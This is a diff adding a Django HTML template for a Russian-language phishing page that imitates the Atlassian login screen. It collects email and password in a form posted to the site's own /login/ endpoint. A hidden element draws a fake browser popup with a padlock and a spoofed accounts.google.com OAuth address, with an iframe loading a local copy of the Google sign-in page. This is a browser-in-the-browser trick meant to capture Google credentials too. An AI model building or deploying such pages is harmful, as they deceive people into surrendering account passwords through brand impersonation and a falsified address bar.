@@ -1,0 +1,102 @@
+<!DOCTYPE html>
+<html lang="en">
+{% load static %}
+
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Atlassian</title>
+    <link rel="stylesheet" href="{% static 'css/atlassian.css' %}">
+	<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+</head>
+
+<body>
+    <div id="window" style="display: none;">
+        <!-- Title bar start -->
+        <div id="title-bar-width">
+            <div id="title-bar">
+                <div style="margin-top:5px;">
+                    <img src="{% static 'images/google-logo.svg' %}" width="20px" height="15px" id="logo">
+                    <span id="logo-description">Вход-Google Аккаунты</span>
+                </div>
+
+                <div>
+                    <span id="minimize">&#8212;</span>
+                    <span id="square">□</span>
+                    <span id="exit">✕</span>
+                </div>
+            </div>
+            <div id="url-bar">
+                <img src="{% static 'images/ssl.svg' %}" width="20px" height="20px" id="ssl-padlock">
+                <span id="domain-name">https://accounts.google.com/</span>
+                <span
+                    id="domain-path">o/oauth2/auth/identifier?client_id=736364594156-c45nfs5lg9msq1vr6cl5150eq2v8mcot.apps.googleusercontent.com&redirect_uri=https%3A%2F%2FJIRA.me%2Fauth%2Fgoogle%2Fcallback&scope=openid%20profile%20email&response_type=code&state=ASBVSAHKVHEfuqe2hqjdfip&flowName=GeneralOAuthFlow</span>
+            </div>
+        </div>
+        <!-- Content start -->
+        <iframe id="content" src="{% static '../templates/google' %}" frameBorder="0"></iframe>
+    </div>
+    <div class="main-block">
+        <div class="top-name-block">
+            <img src="{% static 'images/Atlassian-logo.png' %}" class="top-logo-img">
+        </div>
+        <div class="registration-block">
+
+            <div>
+                <p class="text-1">Войдите в свой аккаунт</p>
+            </div>
+            <form action="/login/" method="post">
+                {% csrf_token %}
+                <input name="login" type="text" class="input username-input"
+                    placeholder="Введите адрес электронной почты">
+                <input name="password" type="password" class="input password-input" placeholder="Введите пароль">
+
+                <button type="submit" class="button">Войти</button>
+            </form>
+            <p class="text-2">или</p>
+            <button class="or-btn google">
+                <img src="{% static 'images/google-logo.svg' %}" class="icon-img">
+                <p class="or-btn-text">Войти с помощью Google</p>
+            </button>
+            <button class="or-btn ">
+                <img src="{% static 'images/microsoft-logo.svg' %}" class="icon-img">
+                <p class="or-btn-text">Войти с помощью Майкрасофт</p>
+
+            </button>
+            <button class="or-btn ">
+                <img src="{% static 'images/apple-logo.svg' %}" class="icon-img">
+                <p class="or-btn-text">Войти с помощью Apple</p>
+
+            </button>
+            <button class="or-btn ">
+                <img src="{% static 'images/slack-logo.svg' %}" class="icon-img">
+                <p class="or-btn-text">Войти с помощью Slack</p>
+
+            </button>
+
+            <div class="line"></div>
+
+            <div class="problems">
+                <p class="problem-text">Не удается войти в систему?</p>
+                <p class="problem-dot">•</p>
+                <p class="problem-text">Регистрация аккаунта</p>
+            </div>
+        </div>
+
+        <div class="text-3-block">
+            <p class="text-3">Политика конфиденциальности</p>
+            <p class="text-3">•</p>
+            <p class="text-3">Уведомление пользователя</p>
+        </div>
+
+        <div class="line-2"></div>
+        <img src="{% static 'images/Atlassian-logo.png' %}" class="buttom-logo-img">
+        <p class="text-4">Один аккаунт для Jira, Confluence, Trello и <span class="text-4-hyper">не только.</span></p>
+    </div>
+    <img src="{% static 'images/left.svg' %}" class="foot-img foot-img-left">
+    <img src="{% static 'images/right.svg' %}" class="foot-img foot-img-right">
+    <script src="{% static 'script/script.js' %}"></script>
+</body>
+
+</html>
